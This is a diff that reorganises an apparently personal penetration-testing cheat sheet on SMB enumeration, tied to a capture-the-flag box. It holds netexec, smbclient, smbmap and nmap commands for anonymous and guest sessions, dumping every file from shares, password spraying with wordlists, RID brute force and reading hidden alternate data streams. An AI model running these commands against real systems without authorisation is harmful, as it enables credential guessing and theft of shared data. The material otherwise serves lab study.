@@ -1,9 +1,56 @@
-### 1st - Try Guest and Anonymous Authentication
+# smb Enumeration
+
+## Check Sessions
+
+### Anonymous Session
+
+Try to create an anonymous session and list the shares:
 
 	smbclient -N -L <hostname>
+
+If there are shares to access we can try to connect doing:
+
 	smbclient \\\\<hostname>\\<sharename>>
 
-### Use msfconsole to scan the smb version
+### Null Session
+
+	netexec smb <target-ip> -u '' -p ''
+
+### Guest Session
+
+	netexec smb <target-ip> -u 'randomusername' -p 'randompassword'
+	netexec smb <target-ip> -u 'Guest' -p ''
+
+
+If we found a session with netexec then do:
+
+	--shares
+	--pass-pol
+	--users
+	--groups
+
+	-M spider_plus #creates a file tree of the shares
+	-M spider_plus -o DOWNLOAD_FLAG=True # to dump all files
+
+	To download a specific file we can use smbmap
+
+## Test users
+
+	netexec smb <target_ip> -u usernames.txt -p passwords.txt --continue-on-success
+
+## When we have a valid username and password
+
+Try to rid-brute force
+
+	netexec smb heist.htb -u 'Guest' -p '' --rid-brute #Guest default password is blank
+
+This valid user might be the default user 'Guest'
+
+## More netexec enum
+
+	https://www.netexec.wiki/smb-protocol/enumeration
+
+## Use msfconsole to scan the smb version
 
 In msfconsole
 
@@ -15,43 +62,6 @@ In msfconsole
 
 	nmap -v -p 445,139 <or_other_smb_ports> --script=smb* <target_ip>
 
-## Enumeration using netexec
-
-	netexec smb <target-ip> -u '' -p ''
-
-	netexec smb <target_ip> -u 'fillername' -p 'fillerpassword' --shares #doesnt work with empty usernames and passwords
-
-	netexec smb <target_ip> -u 'fillername' -p 'fillerpassword' --pass-pol
-
-	netexec smb <target_ip> -u 'fillername' -p 'fillerpassword' -M spider_plus #creates a file tree of the shares
-
-Dump all files
-
-	netexec smb <target_ip> -u 'fillername' -p 'fillerpassword' -M spider_plus -o DOWNLOAD_FLAG=True
-
-https://www.netexec.wiki/smb-protocol/enumeration
-
-## Enumeration using smbmap:
-
-smbmap -H <target_ip> --no-banner
-
-Show he contentes of a share
-
-	smbmap -H <target_ip> --no-banner -r <sharename>
-
-
-
-## Use netexec to find valid usernames and passwords
-
-	netexec smb heist.htb -u usernames.txt -p passwords.txt --continue-on-success
-
-When we have a valid user, we can try the --rid-brute option to possibly reveal other user names
-
-	netexec smb heist.htb -u 'user' -p 'password --rid-brute
-
-	This valid user might be the default user 'Guest'
-
-	netexec smb heist.htb -u 'Guest' -p '' --rid-brute #Guest default password is blank
 
 ## If you find an empty file in the share we can look for some hidden data:
 
@@ -69,10 +79,6 @@ Here the default data stream has 0 bytes, but the Password stream has 15 bytes.
 We can download this data stream by doing:
 
 	get <nameofile>:Password
-
-## When we find valid credentials we can try rid brute to find other usernames
-
-	netexec smb $targetip -u $username -p $password --rid-brute
 
 
 ## If we get a pwned with a user that means we can psexec into the box with that user
